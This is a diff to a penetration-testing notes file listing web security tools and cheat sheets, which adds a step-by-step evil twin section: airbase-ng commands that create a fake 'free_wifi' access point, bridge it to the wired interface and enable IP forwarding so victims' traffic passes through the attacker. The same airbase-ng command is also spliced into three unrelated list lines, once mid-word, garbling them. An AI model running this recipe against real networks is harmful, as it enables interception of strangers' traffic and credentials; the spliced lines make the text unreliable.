@@ -83,7 +83,8 @@ $ sudo tcpdump -i eth0 host 192.168.1.10 -w host_traffic.pcap
    * http://www.websecurify.com Websecurify
    * http://sourceforge.net/projects/grendel/ Grendel-scan
    * https://tools.kali.org/web-applications/gobuster Directory/file and DNS busting tool written in Go
-   * http://www.edge-security.com/wfuzz.php Wfuzz
+   * http://www.edge-security.com/wfuzz.php Wfuzz sudo airbase-ng --essid free_wifi -c 11 wlan1mon
+
    * http://wapiti.sourceforge.net wapiti
    * https://github.com/neuroo/grabber Grabber
    * https://subgraph.com/vega/ Vega
@@ -129,7 +130,8 @@ alker X
    * https://github.com/lalithr95/fuzzapi Fuzzapi is a tool used for REST API pentesting
    * https://github.com/owtf/owtf Offensive Web Testing Framework (OWTF)
    * https://github.com/nccgroup/wssip Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.
-   * https://github.com/PalindromeLabs/STEWS Tool suite for WebSocket discovery, fingerprinting, and vulnerability detection
+   * https://github.com/PalindromeLabs/STEWS Tool suite for WebSocket discover sudo airbase-ng --essid free_wifi -c 11 wlan1mon
+y, fingerprinting, and vulnerability detection
    * https://github.com/tijme/angularjs-csti-scanner Automated client-side template injection (sandbox escape/bypass) detection for AngularJS (ACSTIS).
    * https://reshift.softwaresecured.com A source code analysis tool for detecting and managing Java security vulnerabilities.
    * https://encoding.tools Web app for transforming binary data and strings, including hashes and various encodings. GPLv3 offline version available.
@@ -157,6 +159,7 @@ alker X
    * https://highon.coffee/blog/reverse-shell-cheat-sheet/ - Reverse Shell Cheat Sheet
    * https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ - SQL Injection Cheat Sheet
    * https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ - Path Traversal Cheat Sheet: Windows
+ sudo airbase-ng --essid free_wifi -c 11 wlan1mon
 
 ## Docker images for Penetration Testing
 
@@ -728,6 +731,26 @@ netcat [nc] --> [is a creepy, it can be used to follow you oce or persisant foll
 git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
 cd airgeddon
 sudo bash airgeddon.sh
+
+
+
+--------------------------------------------------------[EVIL-TWIN || FAKE-AP & BRIDGED CONNECTION] -----------------------------------
+**** [EVIL TWIN ATTACK]  USERS WILL SEE A FAKE AP THAT THEY CAN CONNECT TO AND ACCESS INTERNET 
+[-- CREATE FAKE AP --]
+* sudo airbase-ng --essid free_wifi -c 11 wlan1mon
+
+[--- CREATE BRIDGE ---- ]
+* sudo brctl addbr free_wifi_bridge
+
+[--- CONNECT BRIDGE ---- ]
+* sudo brctl addif free_wifi_bridge at0
+* sudo brctl addif free_wifi_bridge eth0
+* sudo ifconfig at0 0.0.0.0 up
+  
+[-----CREATE BRIDGE IP -----]
+* sudo ifconfig free_wifi_bridge 192.168.1.2 [configure so its within the subnet] 
+* sudo ifconfig free_wifi_bridge up         
+* sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 ------------------------------------------------------ [BLUETOOTHNESS ------------------------------------------------------
 
  https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
